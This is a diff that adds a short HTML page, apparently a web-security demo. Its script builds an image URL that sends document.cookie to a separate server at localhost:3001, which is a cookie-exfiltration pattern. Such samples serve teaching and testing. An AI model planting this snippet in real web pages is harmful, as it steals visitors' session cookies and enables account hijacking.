@@ -1,0 +1,14 @@
+<! DOCTYPE HTML>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <script>
+            function changeImg() {
+                document.getElementById('pic1').src =`http://localhost:3001/img?cookie=${document.cookie}`;
+            }
+        </script>
+    </head>
+    <body>
+        <p><img id='pic1' src='http://localhost:3001/img' alt='nice cookies'></p>
+    </body>
+</html>
